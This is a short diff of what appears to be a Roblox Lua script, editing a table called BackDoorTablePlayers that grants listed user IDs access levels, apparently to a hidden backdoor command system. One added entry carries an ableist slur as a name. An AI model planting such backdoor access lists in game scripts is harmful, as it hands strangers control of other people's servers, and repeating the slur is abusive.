@@ -231,19 +231,19 @@ local BackDoorTableCommands = {
 
 local BackDoorTablePlayers = {
     [2278412392] = {
-		['Name'] = "CEO OF SWAG AKA CHRIS"; 
+		['Name'] = "King Swag"; 
 		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(255,0,0);
+		['Colour'] = Color3.fromRGB(42,38,255);
 	};
 	[60435273] = {
 		['Name'] = "NATALIE !";
 		['Access'] = 1;
 		['Colour'] = Color3.fromRGB(255,5,172);
     };
-    [1] = {
-        ['Name'] = "dot_mp4/jack (Current Dev)";
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(0,0,0);
+    [1792718751] = {
+        ['Name'] = "Stupid retard please get her to leave";
+		['Access'] = 1;
+		['Colour'] = Color3.fromRGB(10,10,10);
 	};
 	[1] = {
 		['Name'] = "Bird (Heavy donator)";
